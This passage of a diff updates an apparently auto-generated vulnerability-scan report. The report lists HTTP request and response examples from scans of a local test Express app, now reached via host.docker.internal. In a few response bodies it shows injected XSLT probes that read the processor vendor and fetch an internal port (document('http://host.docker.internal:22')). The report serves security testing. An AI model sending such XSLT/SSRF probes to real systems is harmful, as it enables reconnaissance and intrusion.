+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"206-IrrXfbMCfRtENuafn7VL1+5lxI8\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2583,18 +2960,22 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li><xsl:value-of select="document('http://localhost:22')"/></li>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>"/><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="document('http://host.docker.internal:22')"/></li>
       <li>ZAP</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 15**
+</details>
+
+<details><summary>Example 16</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -2602,9 +2983,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
       }
       ```
@@ -2619,11 +3000,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2631,10 +3012,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "407",
+        "Content-Length": "302",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"197-o3KG3C9J1F26pXoqTV/WyIa6DFo\"",
+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"12e-10ZzD3kPeKB6Fw6CMNFkXrf/FnQ\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2650,21 +3031,19 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li><xsl:value-of select="document('http://localhost:22')"/></li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li></ul>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>ZAP</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 16**
+</details>
+
+<details><summary>Example 17</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -2672,9 +3051,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3739.0 Safari/537.36 Edg/75.0.109.0"
       }
       ```
@@ -2689,11 +3068,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3739.0 Safari/537.36 Edg/75.0.109.0" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2701,10 +3080,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "420",
+        "Content-Length": "315",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"1a4-3xnIp+XzVly+cE7vWk1MaN7Nez4\"",
+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"13b-52cqF2z1H+CMhJbS0reiqvLkugU\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2720,22 +3099,20 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li><xsl:value-of select="document('http://localhost:22')"/></li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>ZAP</li>
       <li>ZAP</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 17**
+</details>
+
+<details><summary>Example 18</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -2743,9 +3120,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
       }
       ```
@@ -2760,11 +3137,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2772,10 +3149,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "302",
+        "Content-Length": "328",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"12e-NUd9AXIUhKg/ZrG/vBaRj1swOp4\"",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"148-jMtUusvwRYGYAISAEwxaNKiGJK8\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2791,17 +3168,21 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>ZAP</li></ul>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>ZAP</li>
+      <li>ZAP</li>
+      <li>ZAP</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 18**
+</details>
+
+<details><summary>Example 19</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -2809,9 +3190,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/91.0"
       }
       ```
@@ -2826,11 +3207,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/91.0" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2838,10 +3219,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "367",
+        "Content-Length": "315",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"16f-AZAC/C5KtLWe6ZFNcLjlpVZDuc0\"",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"13b-52cqF2z1H+CMhJbS0reiqvLkugU\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2857,22 +3238,20 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <ul><li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
       <li>ZAP</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 19**
+</details>
+
+<details><summary>Example 20</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -2880,9 +3259,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
       }
       ```
@@ -2897,11 +3276,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2909,10 +3288,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "302",
+        "Content-Length": "328",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"12e-NUd9AXIUhKg/ZrG/vBaRj1swOp4\"",
+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"148-jMtUusvwRYGYAISAEwxaNKiGJK8\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2928,17 +3307,21 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>ZAP</li></ul>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>ZAP</li>
+      <li>ZAP</li>
+      <li>ZAP</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 20**
+</details>
+
+<details><summary>Example 21</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -2946,9 +3329,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
       }
       ```
@@ -2963,11 +3346,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2975,10 +3358,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "328",
+        "Content-Length": "354",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"148-Ge9JyRfM22q4Gd1Ey7I9Nv95nxY\"",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"162-DPcz2kabVo1ja+wrMo6SSXRgqQg\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2994,8 +3377,10 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <ul><li>ZAP</li>
+      <li>ZAP</li>
+      <li>ZAP</li>
       <li>ZAP</li>
       <li>ZAP</li></ul>
       </body>
@@ -3003,10 +3388,12 @@ The following examples were found in the application.
       
       ```
 
-**Example 21**
+</details>
+
+<details><summary>Example 22</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -3014,9 +3401,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4"
       }
       ```
@@ -3031,11 +3418,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -3043,10 +3430,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "354",
+        "Content-Length": "302",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"162-Yv4sJjwnurb5sL1DnLSO7K0AiIk\"",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"12e-10ZzD3kPeKB6Fw6CMNFkXrf/FnQ\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -3062,21 +3449,19 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li></ul>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>ZAP</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 22**
+</details>
+
+<details><summary>Example 23</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -3084,9 +3469,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16"
       }
       ```
@@ -3101,11 +3486,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -3113,10 +3498,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "341",
+        "Content-Length": "367",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"155-VEAg96LZnMsmn/o+Y0UA6RLfLm4\"",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"16f-WwWaO3c5JLpQ54/XzxwL0PZ7FwI\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -3132,7 +3517,80 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>ZAP</li>
+      <li>ZAP</li>
+      <li>ZAP</li>
+      <li>ZAP</li>
+      <li>ZAP</li>
+      <li>ZAP</li></ul>
+      </body>
+      </html>
+      
+      ```
+
+</details>
+
+<details><summary>Example 24</summary>
+
+* **Request**
+    * **Target**: `http://host.docker.internal:3000/`
+    * **Method**: `POST`
+    * **Headers**:
+      ```json
+      {
+        "cache-control": "no-cache",
+        "content-length": "9",
+        "content-type": "application/x-www-form-urlencoded",
+        "host": "host.docker.internal:3000",
+        "pragma": "no-cache",
+        "referer": "http://host.docker.internal:3000",
+        "user-agent": "msnbot/1.1 (+http://search.msn.com/msnbot.htm)"
+      }
+      ```
+    * **Body**:
+      ```json
+      "words=ZAP"
+      ```
+    * **Curl**:
+      ```shell
+      curl -o - -i \
+        -X POST \
+        --data 'words=ZAP' \
+        -H "cache-control: no-cache" \
+        -H "content-type: application/x-www-form-urlencoded" \
+        -H "host: host.docker.internal:3000" \
+        -H "pragma: no-cache" \
+        -H "referer: http://host.docker.internal:3000" \
+        -H "user-agent: msnbot/1.1 (+http://search.msn.com/msnbot.htm)" \
+        "http://host.docker.internal:3000/"
+      ```
+* **Response**
+    * **Status Code**: `200`
+    * **Headers**:
+      ```json
+      {
+        "Connection": "keep-alive",
+        "Content-Length": "341",
+        "Content-Type": "text/html; charset=utf-8",
+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"155-TK87Td36fgA0KgK93e0RtqEN7mE\"",
+        "Keep-Alive": "timeout=5",
+        "X-Powered-By": "Express"
+      }
+      ```
+    * **Body**:
+      ```html
+      <!doctype html>
+      <html lang="en">
+      <body>
+      <a href="/search">Search</a>
+      <form method="post" action="/">
+        <label for="words">Enter some words</label>
+        <input name="words" id="words" />
+        <button type="submit">Submit</button>
+      </form>
+      e836fe8362e3626c6adbb03926fa58d9
       <ul><li>ZAP</li>
       <li>ZAP</li>
       <li>ZAP</li>
@@ -3141,6 +3599,8 @@ The following examples were found in the application.
       </html>
       
       ```
+
+</details>
 
 ### Unknown Severity
 
